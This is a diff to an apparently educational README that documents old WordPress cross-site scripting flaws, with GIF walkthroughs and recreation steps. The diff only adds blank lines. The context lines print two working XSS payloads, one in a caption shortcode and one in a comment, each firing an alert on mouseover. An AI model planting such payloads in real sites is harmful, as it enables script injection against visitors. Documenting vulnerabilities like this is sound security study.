@@ -28,6 +28,7 @@ Time spent: 10 hours spent in total
     - Fixed in version: 4.2.5
   - [x] GIF Walkthrough: 
   <img src="AuthenticatedShortcodeTagXSS.gif" width="800">
+  
   - [x] Steps to recreate: 
    1. Write TEST!!![caption width="1" caption='<a href="' ">]</a><a href="http://onMouseOver='alert(1)'">Click me</a> in a post
    2. Publish post and mouseover "Click me"
@@ -41,6 +42,7 @@ Time spent: 10 hours spent in total
     - Fixed in version: 4.2.1
   - [x] GIF Walkthrough: 
   <img src="UnauthenticatedStoredXSS.gif" width="800">
+  
   - [x] Steps to recreate: 
   1. Post a comment with the javascript <a title='x onmouseover=alert(unescape(/hello%20world/.source))
 style=position:absolute;left:0;top:0;width:5000px;height:5000px
